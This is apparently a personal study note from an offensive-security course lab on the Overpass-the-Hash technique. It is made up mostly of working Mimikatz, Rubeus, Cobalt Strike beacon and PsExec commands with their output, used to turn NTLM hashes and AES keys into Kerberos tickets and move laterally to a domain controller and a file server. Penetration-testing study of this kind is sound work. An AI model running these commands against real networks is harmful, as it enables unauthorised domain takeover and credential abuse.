---
creation date: September 23rd 2022
last modified date: September 23rd 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Overpass the Hash]]  
___

## Description:  
abuse a NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT) or service ticket, which grants us access to another machine or service as that user (like right clicking an application and selecting "Run as different user").

### With Mimikatz in Powershell

```
mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe

PS C:\Windows\system32> net use \\dc01
The command completed successfully.

PS C:\Windows\system32> klist

PS C:\Tools\active_directory> .\PsExec.exe \\dc01 cmd.exe
PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com
C:\Windows\system32> whoami

```

list the cached Kerberos tickets with klist

If you have a service account hash an Pass the Ticket or [[Silver Ticket]] can be done.


### In CobaltStrike


Overpass-the-Hash (also known pass-the-key) allows authentication to take place over Kerberos rather than NTLM.  You can use the NTLM hash or AES keys for a user to request a Kerberos TGT.

Using NTLM hash

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jking /domain:dev.cyberbotic.io /rc4:4ffd3eabdce2e158d923ddec72de979e /nowrap

[*] Action: Ask TGT
```

TGTs with the AES keys

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jking /domain:dev.cyberbotic.io /aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1 /nowrap /opsec

[*] Action: Ask TGT
```

Use `klist` to display the Kerberos tickets in the current logon session

```
beacon> run klist

Current LogonId is 0:0x1f253

Cached Tickets: (4)

#0>    Client: bfarmer @ DEV.CYBERBOTIC.IO
    Server: krbtgt/DEV.CYBERBOTIC.IO @ DEV.CYBERBOTIC.IO

#1>    Client: bfarmer @ DEV.CYBERBOTIC.IO
    Server: krbtgt/DEV.CYBERBOTIC.IO @ DEV.CYBERBOTIC.IO

```

To pass the TGT into this logon session, we can use Beacon's `kerberos_ticket_use` command. This requires that the ticket be on disk of our attacking workstation (not the target).

Powershell
```
PS C:\> [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
```

bash
```
root@kali:~# echo -en "[...ticket...]" | base64 -d > jkingTGT.kirbi
```

Import in CS
```
beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

beacon> ls \\srv-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     12/13/2017 21:00:56   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)

```


If you're in an elevated context, Rubeus can shorten some of these steps.

```
beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jking /domain:dev.cyberbotic.io /aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1 /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe

[*] Action: Ask TGT
[*] Showing process : False
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 3044
[+] LUID            : 0x85a103

[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Using aes256_cts_hmac_sha1 hash: a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1
[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\jking'
[*] Target LUID : 8757507
[+] TGT request successful!
[*] base64(ticket.kirbi):

      [...ticket...]

[*] Target LUID: 0x85a103
[+] Ticket successfully imported!

  ServiceName           :  krbtgt/DEV.CYBERBOTIC.IO
  ServiceRealm          :  DEV.CYBERBOTIC.IO
  UserName              :  jking
  UserRealm             :  DEV.CYBERBOTIC.IO
  StartTime             :  3/4/2021 12:48:16 PM
  EndTime               :  3/4/2021 10:48:16 PM
  RenewTill             :  3/11/2021 12:48:16 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  aes256_cts_hmac_sha1
  Base64(key)           :  Jr93ezQ6z+rc0/1h30UXaGxVkRLVsWSl9mG0nNeXuTU=

beacon> steal_token 3044
[+] Impersonated NT AUTHORITY\SYSTEM

beacon> ls \\srv-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     12/13/2017 21:00:56   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     02/23/2021 17:08:43   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/17/2021 18:28:36   System Volume Information
          dir     02/17/2021 18:32:08   Users
          dir     02/17/2021 18:28:54   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 256mb    fil     03/04/2021 10:12:52   pagefile.sys

```





___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 23rd 2022 (05:45 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
